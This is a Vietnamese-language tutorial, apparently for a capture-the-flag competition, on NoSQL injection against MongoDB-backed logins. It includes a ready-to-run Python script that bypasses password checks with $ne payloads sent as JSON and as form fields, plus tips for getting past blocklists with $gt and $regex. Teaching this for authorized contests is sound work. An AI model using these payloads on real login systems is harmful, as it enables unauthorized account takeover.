# NoSQLi (chèn lệnh giả vào câu hỏi database kiểu MongoDB)

NoSQLi giống SQLi (bài trước) nhưng database ở đây không phải MySQL/PostgreSQL mà là loại database "document" (lưu dữ liệu giống JSON), phổ biến nhất là MongoDB. Thay vì gửi 1 chuỗi để phá câu lệnh SQL, ở đây bạn gửi hẳn 1 cấu trúc dữ liệu khác (object) vào đúng vị trí web chỉ mong đợi 1 giá trị thường (ví dụ mật khẩu). Database hiểu object đó là "toán tử" (một kiểu lệnh so sánh đặc biệt, viết bằng key bắt đầu dấu `$`), nên điều kiện kiểm tra bị đổi nghĩa hoàn toàn mà bạn không cần biết giá trị thật.

Ví dụ dễ hiểu: web hỏi database "tìm user có password đúng bằng cái người dùng gõ". Nếu bạn gõ được `{"$ne": ""}` (nghĩa là "không bằng chuỗi rỗng") thay vì gõ 1 chuỗi mật khẩu thật, database sẽ hiểu thành "tìm user có password KHÔNG BẰNG rỗng" — mật khẩu thật nào cũng khác rỗng, nên điều kiện luôn đúng, bạn đăng nhập được mà chẳng cần biết mật khẩu.

Trên Burp bạn nhận ra lỗi này khi: request login gửi body dạng JSON (`Content-Type: application/json`), có cookie kiểu `connect.sid` (dấu hiệu Node.js/Express hay đi cùng MongoDB), và gõ dấu nháy `'` không gây lỗi gì cả (loại trừ SQLi) — lúc đó nên thử sửa value của 1 field (ví dụ `password`) từ chuỗi `"anything"` thành object `{"$ne": ""}` (nhớ xóa dấu ngoặc kép quanh value để nó là object JSON thật, không phải chuỗi).

## Snippet copy-là-chạy

```python
import re
import requests

base = "http://target"
s = requests.Session()
s.verify = False

def solve_one(session, base_url):
    # Bước 1: thử bypass đăng nhập bằng toán tử $ne ("không bằng")
    # Thay vì gửi password là 1 chuỗi, ta gửi 1 object -- đây chính là "cấu trúc giả" đánh lừa MongoDB
    r = session.post(
        f"{base_url}/login",
        json={"username": "admin", "password": {"$ne": ""}},
        timeout=5,
    )
    if "FHACKER2026{" in r.text:
        m = re.search(r"FHACKER2026\{[0-9a-fA-F]{64}\}", r.text)
        return m.group(0) if m else None

    # Bước 2: nếu app nhận form-urlencoded (không phải JSON), MongoDB-style
    # dùng cú pháp mảng kiểu PHP: password[$ne]=1 -- nhiều framework (Express + body-parser) tự
    # hiểu cú pháp này thành đúng object {"$ne": "1"}
    r2 = session.post(
        f"{base_url}/login",
        data={"username": "admin", "password[$ne]": "1"},
        timeout=5,
    )
    m = re.search(r"FHACKER2026\{[0-9a-fA-F]{64}\}", r2.text)
    return m.group(0) if m else None


if __name__ == "__main__":
    print("Flag:", solve_one(s, base))
```

## Giải thích cho người mới

- `json={"username": "admin", "password": {"$ne": ""}}` — khi dùng tham số `json=` của `requests`, thư viện tự biến dict Python thành đúng JSON body và tự set header `Content-Type: application/json`. Chú ý `password` ở đây là 1 dict lồng trong dict ngoài, không phải chuỗi — đúng y như việc bạn xóa dấu ngoặc kép quanh value trong Burp.
- `$ne` là tên 1 toán tử của MongoDB (not equal — không bằng). Database không biết "ý đồ" lập trình viên chỉ muốn so sánh bằng, nó chỉ thấy object có key bắt đầu `$` và thực thi đúng theo nghĩa toán tử đó.
- Bước 2 minh họa trường hợp app không nhận JSON mà nhận form (`data=` thay vì `json=`) — lúc đó phải đổi payload thành chuỗi key `"password[$ne]"`, một số framework tự parse cú pháp mảng này thành object giống bước 1.
- Script thử cả 2 cách theo thứ tự, cách nào ra flag trước thì dừng và trả về — không cần biết trước app dùng kiểu nào.

## Lưu ý nhanh

- Luôn thử trước bằng Burp: sửa `"password": "x"` thành `"password": {"$ne": ""}`, nhớ xóa dấu ngoặc kép quanh object — nếu vẫn để `"password": "{\"$ne\": \"\"}"` (vẫn là chuỗi) thì sẽ KHÔNG hoạt động.
- Nếu `$ne` bị app chặn theo danh sách từ cấm, thử đổi sang toán tử khác cùng hiệu quả: `$gt` (lớn hơn) hoặc `$regex` (khớp biểu thức, gửi `.*` để khớp mọi giá trị).
- Nếu không thấy khác biệt rõ ràng ở response (không có chữ "Welcome" hay dấu hiệu đăng nhập thành công), đây là dạng "mù" (blind) — phải đoán từng ký tự bằng `$regex` lặp, không nằm trong snippet rút gọn này.
- Chỉ dùng trên hệ thống được phép (máy chủ của đội mình/đối phương trong phạm vi thi đấu).
